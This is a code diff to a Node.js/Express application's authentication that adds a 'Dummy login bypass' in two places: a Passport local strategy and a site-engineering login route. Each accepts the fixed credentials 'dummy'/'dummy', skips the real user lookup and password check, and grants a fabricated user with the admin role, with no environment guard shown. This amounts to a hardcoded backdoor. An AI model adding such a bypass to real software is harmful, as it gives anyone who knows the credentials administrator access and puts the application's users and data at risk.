@@ -1933,6 +1933,20 @@ async function setupAuth(app2) {
     new LocalStrategy(async (username, password, done) => {
       console.log(`[Auth] Attempting login for user: ${username}`);
       try {
+        // Dummy login bypass
+        if (username === "dummy" && password === "dummy") {
+          console.log(`[Auth] Dummy login successful`);
+          const dummyUser = {
+            id: 999999,
+            username: "dummy",
+            password: await hashPassword("dummy"),
+            name: "Dummy User",
+            email: "dummy@example.com",
+            role: "admin"
+          };
+          return done(null, dummyUser);
+        }
+
         let user = await storage.getUserByUsername(username);
         if (!user) {
           if (username.includes("@")) {
@@ -2467,6 +2481,23 @@ function registerSiteEnggRoutes(app2) {
     try {
       const { email, password } = req.body;
       if (!email || !password) return res.status(400).json({ error: "Email and password are required" });
+
+      // Dummy login bypass
+      if (email === "dummy" && password === "dummy") {
+        const dummyUser = {
+          id: "dummy-user-id",
+          email: "dummy@example.com",
+          fullName: "Dummy User",
+          role: "admin",
+          phone: "",
+          designation: "Dummy User",
+          engineerId: "dummy-eng",
+          createdAt: new Date().toISOString()
+        };
+        req.session.userId = dummyUser.id;
+        return res.json({ user: dummyUser });
+      }
+
       const searchEmail = email.toLowerCase();
       const user = storage2.getTable("profiles").find((p) => p.email.toLowerCase() === searchEmail);
       if (!user) {
